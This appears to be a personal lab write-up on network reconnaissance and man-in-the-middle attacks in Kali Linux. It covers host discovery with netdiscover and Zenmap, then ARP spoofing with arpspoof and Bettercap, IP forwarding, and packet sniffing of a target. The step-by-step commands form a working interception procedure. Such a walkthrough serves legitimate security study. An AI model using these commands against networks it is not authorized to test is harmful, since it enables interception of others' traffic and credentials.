# Wireless Network Security Analysis

## Objective
Post Network monitoring like gathering information and checking if MITM attacks are possible

### Skills Learned

- Connecting wireless adapter to Virtual Machine
- Maping a network either wired or wireless

### Tools used

- Netdiscover
- Zenmap
- nmap
- ARP spoof
- Bettercap

### Steps to use netdiscover

- In Kali linux we will use ifconfig to find our IP address
- Look for Your Active Network Interface:
  - If you’re using Ethernet (wired connection), the interface is likely eth0 or enp0s3.
  - If you’re using Wi-Fi, the interface is usually wlan0 or wlp2s0.
```bash
ifconfig
```
> Linux provides a command called ip and it has an option called addr (address). Type ip, a space, addr, and press Enter.
```bash
ip addr
```
- The IP address (e.g., 192.168.233.133) will follow immediately after inet.
- We will use netdiscover to scan all the ip addresses range
```bash
netdiscover -r 192.168.1.1/24
```
- If we connect a wifi adapter then we can connect to Wifi from the VM of Kali linux and make a scan with the IP address of wlan0

### Steps to use Zenmap

- We open zenmap
```bash
zenmap
```
- We will enter the IP we want to scan and it will show us the nmap code for the profile you choose
<img width="803" alt="image" src="https://github.com/user-attachments/assets/c1be386f-f06e-410b-93fe-f71286488ee4" />

<img width="785" alt="image" src="https://github.com/user-attachments/assets/9abeb0f6-83c8-4b3a-9f72-d90feac5406d" />

- A ping scan in Zenmap is a quick way to discover active hosts on a network by sending ICMP echo requests (ping packets).
- Quick Scan in Zenmap (or Nmap) is designed to rapidly scan a network or individual host to identify open ports and services without performing a deep inspection.
- Quick Scan Plus
This is an Nmap scan profile that performs a slightly more thorough scan compared to a regular "Quick Scan." Here's what it does: Scans the top 1000 TCP ports.
Detects service versions (using -sV). Enables OS detection (using -O). Performs a traceroute (using --traceroute).

### Steps for ARP Spoofing
- We will use ifconfig to find the network interface that the our machine is connected to as well as the target
- In the target network we use arp -a to check the MAC address of the router
- Then we use apr command to gateway IP and the network connected
```bash
arp -a
_gateway (192.168.233.2) at 00:50:56:e8:f0:27 [ether] on eth2
```
- Then we run arpspoof tool in two different terminals the top is to fool the victim and the bottom to fool the router
<img width="637" alt="image" src="https://github.com/user-attachments/assets/5a0edc68-be55-4e66-ac43-eab13807d124" />

- Now we go to the target machine and use arp -a command to see the MAC address of the router is changed to the VM MAC address
<img width="466" alt="image" src="https://github.com/user-attachments/assets/9c2e45b6-52ca-48ec-9dba-f4bc034cf5c6" />

- Tha Kali linux need to have port forwarding
```bash
  echo 1 > /proc/sys/net/ipv4/ip_forward
```
### Steps for Bettercap

- To access to the Bettercap prompt we will put the interface we are connected to
```bash
bettercap -iface eth2
```
- We can access the help menu by entering help and we can see all the modules we have

<img width="359" alt="image" src="https://github.com/user-attachments/assets/a86952bb-ac4c-4197-98c2-26a2b111b6c4" />

- We can see the discription of any module by typing help then the name of the module
```bash
help net.probe
```
- We can turn on net.probe by typing the following
```bash
net.probe on
```
> we can see the clients connected to the same network as our workstation.
> The ***net.recon*** gets activated as well.

- We type ***net.show*** to see all the connect clients in a table
- We can use ***arp.spoof*** module to make arp spoof attacks
```bash
help arp.spoof
```
- We will change the parameter **arp.spoof.fullduplex** : If true, both the targets and the gateway will be attacked, otherwise only the target (if the router has ARP spoofing protections in place this will make the attack fail). (default=false)
```bash
set arp.spoof.fullduplex true
```
- We will also change the targets parameter
```bash
arp.spoof.targets : Comma separated list of IP addresses, MAC addresses or aliases to spoof, also supports nmap style IP ranges. (default=<entire subnet>)
set arp.spoof.targets (the IP address of the target)
```
- We need to turn the **arp.spoof** on
```bash
arp.spoof on
```
> make sure net.probe and net.recon are both running
- Now MITM attack is a success
- We then activate net.sniff to capture all the packets that come from the target
```bash
net.sniff
```    
> To see details on currently running modules at any time, use the **active** command.




